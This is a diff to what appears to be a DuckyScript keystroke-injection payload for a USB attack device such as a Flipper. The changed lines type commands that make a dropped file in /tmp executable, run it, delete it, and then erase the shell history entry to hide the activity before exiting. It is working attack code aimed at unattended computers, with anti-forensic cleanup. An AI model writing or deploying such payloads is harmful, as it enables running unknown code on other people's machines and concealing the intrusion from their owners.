@@ -55,10 +55,6 @@ STRING EOF
 DELAY 200
 ENTER
 DELAY 300
-STRING chmod +x /tmp/tmppp && /tmp/./tmppp && rm /tmp/tmppp
+STRING chmod +x /tmp/tmppp && /tmp/./tmppp && rm /tmp/tmppp && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history && exit
 DELAY 200
 ENTER
-STRING history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line set -o history && exit
-DELAY 200
-ENTER
-REM insert capslock flashing code here if not using a flipper or other debugger.
